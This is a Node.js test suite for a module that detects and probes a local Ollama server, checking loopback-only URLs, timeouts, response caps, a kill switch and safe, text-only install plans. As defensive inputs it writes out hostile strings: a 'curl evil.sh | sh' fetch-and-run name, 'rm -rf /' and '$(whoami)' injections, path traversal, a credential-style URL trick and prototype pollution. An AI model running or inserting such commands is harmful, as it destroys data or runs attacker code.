// 23-point item 6: Local AI manager (Ollama). Offline: every HTTP call goes to an injected fake fetch; hardware detection is injected; nothing is installed or run.
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import { createLocalAiManager, assertLoopbackBaseUrl, validateFitTable, validateTagEntry, registryIdFor, CHAT_MODEL_FIT_TABLE, LOCAL_AI_STATUSES, FIT_TABLE_LABEL, LOCAL_AI_LIMITS } from "../atlasz-addons/local-ai-manager.mjs";
import { createModelRegistry } from "../atlasz-addons/model-registry.mjs";
import { tmp, rm } from "./helpers.mjs";

const GB = 1024 ** 3;
const fakeOs = (ramGB = 16, cpus = 8) => ({ totalmem: () => ramGB * GB, freemem: () => ramGB * GB / 2, cpus: () => Array.from({ length: cpus }, () => ({})) });
const detectOptions = ({ ramGB = 16, cpus = 8, binary = true } = {}) => ({ env: { PATH: "" }, os: fakeOs(ramGB, cpus), exists: () => false, findBinary: b => (b === "ollama" && binary ? "/usr/bin/ollama" : null), canResolve: () => false });
const json = (o, init = {}) => new Response(JSON.stringify(o), { status: 200, headers: { "content-type": "application/json" }, ...init });
const DIG = "a".repeat(64);
function fakeFetch(routes) {
  const calls = [];
  const f = async (url, opts) => { calls.push({ url, opts }); const r = routes[new URL(url).pathname]; if (!r) throw new TypeError("fetch failed"); return typeof r === "function" ? r(url, opts) : r(); };
  f.calls = calls; return f;
}
const running = (models = []) => fakeFetch({ "/api/version": () => json({ version: "0.5.7" }), "/api/tags": () => json({ models }) });
const mk = (o = {}) => createLocalAiManager({ gate: () => ({ allowed: true }), detectOptions: detectOptions(o.hw ?? {}), ...o });

test("refuses every non-loopback base URL at construction (raw string checked, not the normalised one)", () => {
  for (const u of ["http://localhost:11434", "http://[::1]:11434", "http://0x7f.0.0.1:11434", "http://2130706433:11434", "http://127.1:11434", "http://127.0.0.1@evil.example:11434", "http://user:pw@127.0.0.1:11434",
    "https://127.0.0.1:11434", "http://127.0.0.1:11434/api", "http://127.0.0.1:11434?x=1", "http://10.0.0.5:11434", "http://api.example.com", "http://127.0.0.1.nip.io:11434", "http://127.0.0.1:99999", "http://127.0.0.1:0", " http://127.0.0.1:11434", null, 42])
    assert.throws(() => createLocalAiManager({ baseUrl: u }), /LOCAL_AI_BASE_URL_MUST_BE_127_0_0_1/, String(u));
  assert.equal(assertLoopbackBaseUrl("http://127.0.0.1:11434").origin, "http://127.0.0.1:11434");
  assert.equal(assertLoopbackBaseUrl("http://127.0.0.1:8080/").port, 8080);
});

test("status vocabulary: NOT_INSTALLED / INSTALLED_NOT_RUNNING / RUNNING / MODEL_PRESENT, never LIVE", async () => {
  assert.deepEqual([...LOCAL_AI_STATUSES], ["NOT_INSTALLED", "INSTALLED_NOT_RUNNING", "RUNNING", "MODEL_PRESENT"]);
  const down = fakeFetch({});
  assert.equal((await mk({ fetchImpl: down, hw: { binary: false } }).status()).state, "NOT_INSTALLED");
  assert.equal((await mk({ fetchImpl: down, hw: { binary: true } }).status()).state, "INSTALLED_NOT_RUNNING");
  assert.equal((await mk({ fetchImpl: running([]) }).status()).state, "RUNNING");
  const s = await mk({ fetchImpl: running([{ name: "llama3.2:3b", size: 2 * GB, digest: DIG, details: { family: "llama", parameter_size: "3.2B", quantization_level: "Q4_K_M", format: "gguf" } }]) }).status();
  assert.equal(s.state, "MODEL_PRESENT"); assert.equal(s.models[0].name, "llama3.2:3b"); assert.equal(s.models[0].quantization, "Q4_K_M");
  assert.ok(!JSON.stringify(s).includes("LIVE\""), "no LIVE state field"); assert.match(s.note, /not LIVE/);
  const noFetch = await mk({ fetchImpl: null, hw: { binary: true } }).status(); assert.equal(noFetch.state, "INSTALLED_NOT_RUNNING"); assert.equal(noFetch.probe, "FETCH_NOT_CONFIGURED");
});

test("every request goes to the loopback origin, GET only, redirects refused", async () => {
  const f = running([]); await mk({ fetchImpl: f }).status();
  assert.ok(f.calls.length >= 2);
  for (const c of f.calls) { assert.ok(c.url.startsWith("http://127.0.0.1:11434/api/")); assert.equal(c.opts.method, "GET"); assert.equal(c.opts.redirect, "error"); assert.equal(c.opts.body, undefined); }
  const redirected = fakeFetch({ "/api/version": () => { const r = json({ version: "0.5.7" }); Object.defineProperty(r, "url", { value: "http://evil.example/api/version" }); return r; } });
  const s = await mk({ fetchImpl: redirected, hw: { binary: false } }).status(); assert.equal(s.state, "NOT_INSTALLED"); assert.equal(s.probe, "RESPONSE_FROM_OTHER_URL");
});

test("malformed Ollama JSON never yields RUNNING or models", async () => {
  const cases = [() => new Response("not json", { status: 200 }), () => json({}), () => json({ version: 7 }), () => json({ version: "latest; rm -rf /" }), () => json(null), () => json([1, 2]), () => new Response("{\"version\":\"1.0.0\"}", { status: 500 }), () => json({ version: "0.5.7".repeat(20) })];
  for (const [i, v] of cases.entries()) {
    const s = await mk({ fetchImpl: fakeFetch({ "/api/version": v }), hw: { binary: true } }).status();
    assert.equal(s.state, "INSTALLED_NOT_RUNNING", "case " + i); assert.deepEqual(s.models, []);
  }
  // tags malformed: server is RUNNING but no model is trusted
  for (const tags of [{}, { models: "x" }, { models: null }, { models: Array.from({ length: LOCAL_AI_LIMITS.maxModels + 1 }, (_, i) => ({ name: "m" + i })) }]) {
    const s = await mk({ fetchImpl: fakeFetch({ "/api/version": () => json({ version: "0.5.7" }), "/api/tags": () => json(tags) }) }).status();
    assert.equal(s.state, "RUNNING"); assert.deepEqual(s.models, []); assert.ok(s.tagsError);
  }
});

test("individual hostile tag entries are rejected and counted; the rest are kept", async () => {
  const models = [{ name: "good:latest", size: 10 }, { name: "bad; curl evil.sh | sh" }, { name: "../../etc/passwd" }, { name: "x", size: -1 }, { name: "y", size: 1.5 }, { name: "z", digest: "zzzz" }, { name: "w\u202e" }, "string", null, { name: "good:latest" }, { model: "alt/name:tag" }];
  const s = await mk({ fetchImpl: running(models) }).status();
  assert.deepEqual(s.models.map(m => m.name), ["good:latest", "alt/name:tag"]); assert.equal(s.rejectedEntries, 9);
  assert.equal(validateTagEntry({ name: "a", details: { family: "<script>" } }).family, null);
  const proto = await mk({ fetchImpl: fakeFetch({ "/api/version": () => json({ version: "0.5.7" }), "/api/tags": () => new Response('{"models":[{"name":"a","__proto__":{"polluted":true}}]}') }) }).status();
  assert.equal(({}).polluted, undefined); assert.equal(proto.models.length, 1);
});

test("huge responses are cut off by the byte cap (streamed and content-length)", async () => {
  const big = () => new Response("{\"version\":\"" + "9".repeat(LOCAL_AI_LIMITS.maxResponseBytes + 10) + "\"}");
  let s = await mk({ fetchImpl: fakeFetch({ "/api/version": big }), hw: { binary: true } }).status(); assert.equal(s.probe, "RESPONSE_TOO_LARGE");
  const declared = () => new Response("{}", { headers: { "content-length": String(50 * 1024 * 1024) } });
  s = await mk({ fetchImpl: fakeFetch({ "/api/version": declared }), hw: { binary: true } }).status(); assert.equal(s.probe, "RESPONSE_TOO_LARGE");
  const textOnly = () => ({ status: 200, headers: { get: () => null }, text: async () => "x".repeat(2000) });
  s = await mk({ fetchImpl: fakeFetch({ "/api/version": textOnly }), hw: { binary: true }, maxResponseBytes: 1000 }).status(); assert.equal(s.probe, "RESPONSE_TOO_LARGE");
  assert.throws(() => mk({ maxResponseBytes: 10 * 1024 * 1024 }), /MAX_RESPONSE_BYTES_INVALID/);
});

test("a hanging server times out instead of blocking", async () => {
  const hang = fakeFetch({ "/api/version": () => new Promise(() => {}) });
  const t0 = Date.now(); const s = await mk({ fetchImpl: hang, timeoutMs: 50, hw: { binary: true } }).status();
  assert.equal(s.probe, "TIMEOUT"); assert.ok(Date.now() - t0 < 2000);
});

test("health probe: PROBE_PASSED / PROBE_FAILED with latency, never LIVE", async () => {
  let t = 1000; const clock = () => (t += 7);
  const h = await mk({ fetchImpl: running([]), clock }).health(); assert.equal(h.result, "PROBE_PASSED"); assert.equal(h.version, "0.5.7"); assert.ok(h.latencyMs >= 0); assert.match(h.note, /not LIVE/);
  const f = await mk({ fetchImpl: fakeFetch({}) }).health(); assert.equal(f.result, "PROBE_FAILED"); assert.equal(f.ok, false);
  const bad = await mk({ fetchImpl: fakeFetch({ "/api/version": () => json({ version: { $gt: "" } }) }) }).health(); assert.equal(bad.result, "PROBE_FAILED");
});

test("kill switch: PAUSE_ALL stops status and health probes (no fetch made)", async () => {
  const f = running([]); const m = createLocalAiManager({ fetchImpl: f, gate: () => ({ allowed: false, reason: "PAUSE_ALL" }), detectOptions: detectOptions() });
  const s = await m.status(); assert.equal(s.ok, false); assert.match(s.reason, /EMERGENCY_STOP/);
  const h = await m.health(); assert.equal(h.result, "PROBE_NOT_RUN"); assert.equal(f.calls.length, 0);
});

test("hardware discovery reuses detectEmbeddingRuntime and makes no network call", () => {
  const f = running([]); const hw = mk({ fetchImpl: f, hw: { ramGB: 8, cpus: 4, binary: false } }).discoverHardware();
  assert.equal(hw.ok, true); assert.equal(hw.ramMB, 8192); assert.equal(hw.cpus, 4); assert.equal(hw.ollamaBinaryFound, false); assert.equal(f.calls.length, 0);
  const broken = createLocalAiManager({ detect: () => { throw new Error("boom"); } }).discoverHardware(); assert.equal(broken.ok, false);
});

test("fit table is labelled ESTIMATE and rates against RAM/CPU", () => {
  const small = mk({ hw: { ramGB: 8, cpus: 4 } }).fit(); assert.equal(small.label, FIT_TABLE_LABEL); assert.equal(FIT_TABLE_LABEL, "ESTIMATE");
  const by = Object.fromEntries(small.models.map(m => [m.model, m.fit]));
  assert.equal(by["llama3.2:1b"], "COMFORTABLE"); assert.equal(by["llama3.1:8b"], "TIGHT"); assert.equal(by["llama3.3:70b"], "TOO_LARGE");
  for (const m of small.models) assert.equal(m.basis, "ESTIMATE");
  assert.equal(mk({ hw: { ramGB: 128, cpus: 32 } }).fit().models.find(m => m.model === "llama3.3:70b").fit, "COMFORTABLE");
});

test("owner can edit the fit table; invalid tables are refused", () => {
  const m = mk({ hw: { ramGB: 8, cpus: 4 } });
  assert.equal(m.setFitTable([{ model: "my-model:q4", approxDownloadGB: 1, approxRamGB: 2, minCpuCores: 1, note: "owner entry" }]).ok, true);
  assert.deepEqual(m.fit().models.map(x => x.model), ["my-model:q4"]);
  for (const bad of [[], "x", [{ model: "a;b", approxDownloadGB: 1, approxRamGB: 1, minCpuCores: 1 }], [{ model: "a", approxDownloadGB: NaN, approxRamGB: 1, minCpuCores: 1 }], [{ model: "a", approxDownloadGB: 1, approxRamGB: 1, minCpuCores: 1.5 }],
    [{ model: "a", approxDownloadGB: 1, approxRamGB: 1, minCpuCores: 1, note: "x\u0000" }], [{ model: "a", approxDownloadGB: 1, approxRamGB: 1, minCpuCores: 1 }, { model: "a", approxDownloadGB: 1, approxRamGB: 1, minCpuCores: 1 }], Array.from({ length: 61 }, (_, i) => ({ model: "m" + i, approxDownloadGB: 1, approxRamGB: 1, minCpuCores: 1 }))])
    assert.equal(m.setFitTable(bad).ok, false, JSON.stringify(bad).slice(0, 60));
  assert.ok(validateFitTable(CHAT_MODEL_FIT_TABLE).table);
  assert.throws(() => createLocalAiManager({ fitTable: [{ model: "" }] }), /FIT_TABLE_INVALID/);
});

test("plan() returns text only, never executes, refuses shell-unsafe model names", () => {
  const m = mk({ hw: { ramGB: 8, cpus: 4, binary: false } });
  const p = m.plan({ model: "llama3.2:3b", platform: "linux" });
  assert.equal(p.ok, true); assert.equal(p.executes, false); assert.equal(p.kind, "TEXT_PLAN_ONLY"); assert.ok(Object.isFrozen(p) && Object.isFrozen(p.steps));
  const cmds = p.steps.map(s => s.command).filter(Boolean).join("\n");
  assert.match(cmds, /ollama pull llama3\.2:3b/); assert.match(cmds, /OLLAMA_HOST=127\.0\.0\.1:11434/); assert.match(cmds, /install\.sh -o/); assert.doesNotMatch(cmds, /\| *sh/, "never pipe a download straight into a shell");
  for (const bad of ["llama; rm -rf ~", "$(whoami)", "a b", "x`id`", "../x", "a|b", ""]) assert.equal(m.plan({ model: bad, platform: "linux" }).reason, "MODEL_NAME_INVALID", bad);
  assert.equal(m.plan({ model: "llama3.3:70b", platform: "linux" }).fit, "TOO_LARGE"); assert.ok(m.plan({ model: "llama3.3:70b", platform: "linux" }).warnings.length);
  assert.match(m.plan({ model: "unknown-model:1b", platform: "win32" }).warnings.join(" "), /not in the fit table/);
  assert.equal(m.plan({ platform: "plan9" }).ok, false);
  const src = fs.readFileSync(new URL("../atlasz-addons/local-ai-manager.mjs", import.meta.url), "utf8");
  assert.doesNotMatch(src, /from\s+["'](?:node:)?child_process["']|import\(\s*["'](?:node:)?child_process|require\(|\bexecSync\(|\bspawn\(|\beval\(|new Function\(|\bwriteFile/, "the manager has no way to execute or install anything");
});

test("registerDiscovered adds local models DISABLED, LOCAL, FREE through the real registry API; idempotent", async () => {
  const dir = tmp("lai-reg-"); try {
    const reg = createModelRegistry({ dir, gate: () => ({ allowed: true }) });
    const m = mk({ fetchImpl: running([{ name: "llama3.2:3b", size: 2 * GB, digest: "sha256:" + DIG }, { name: "nomic-embed-text:latest", details: { family: "nomic-bert" } }, { name: "hf.co/Org/Some.Model-GGUF:Q4_K_M" }]) });
    assert.equal(m.registerDiscovered(reg).reason, "NO_DISCOVERED_MODELS_RUN_STATUS_FIRST");
    await m.status(); const r = m.registerDiscovered(reg);
    assert.equal(r.ok, true); assert.equal(r.added.length, 3);
    for (const a of r.added) { const g = reg.getModel(a.id); assert.equal(g.enabled, false); assert.equal(g.kind, "LOCAL"); assert.equal(g.costClass, "FREE"); assert.deepEqual(g.egressHosts, ["127.0.0.1"]); assert.equal(g.live, false); }
    assert.equal(reg.getModel("ollama-llama3.2-3b").version, "0.0.0-d" + DIG.slice(0, 12));
    assert.deepEqual(reg.getModel("ollama-nomic-embed-text-latest").capabilities, ["embedding"]);
    const again = m.registerDiscovered(reg); assert.equal(again.added.length, 0); assert.equal(again.skipped.length, 3);
    assert.equal(reg.status().enabled, 0);
  } finally { rm(dir); }
});

test("registerDiscovered refuses a tampered/non-loopback ollama provider, a fake status and junk registries", async () => {
  const fakeReg = { addModel: () => ({ ok: true }), getModel: () => null, addProvider: () => ({ ok: true }), listProviders: () => [{ id: "ollama-local", kind: "CLOUD", egressHosts: ["api.example.com"], credentialRef: null }] };
  const m = mk({ fetchImpl: running([{ name: "a" }]) }); await m.status();
  assert.equal(m.registerDiscovered(fakeReg).reason, "OLLAMA_PROVIDER_NOT_LOOPBACK_LOCAL");
  for (const p of [{ kind: "CLOUD", egressHosts: ["127.0.0.1"], credentialRef: null }, { kind: "LOCAL", egressHosts: ["127.0.0.1"], credentialRef: "SOME_KEY" }, { kind: "LOCAL", egressHosts: ["127.0.0.1", "api.example.com"], credentialRef: null }])
    assert.equal(m.registerDiscovered({ ...fakeReg, listProviders: () => [{ id: "ollama-local", ...p }] }).reason, "OLLAMA_PROVIDER_NOT_LOOPBACK_LOCAL", JSON.stringify(p));
  assert.equal(m.registerDiscovered(null).reason, "REGISTRY_REQUIRED");
  const dir = tmp("lai-reg2-"); try {
    const reg = createModelRegistry({ dir });
    const forged = m.registerDiscovered(reg, { statusResult: { ok: true, state: "MODEL_PRESENT", models: [{ name: "evil; rm -rf /" }, { name: "x".repeat(300) }] } });
    assert.equal(forged.added.length, 0); assert.equal(forged.refused.length, 2);
    assert.equal(m.registerDiscovered(reg, { statusResult: { ok: true, state: "RUNNING", models: [] } }).ok, false);
  } finally { rm(dir); }
  assert.match(registryIdFor("a".repeat(70) + ":tag"), /^ollama-a+-[0-9a-f]{8}$/); assert.ok(registryIdFor("a".repeat(70)).length <= 64);
});
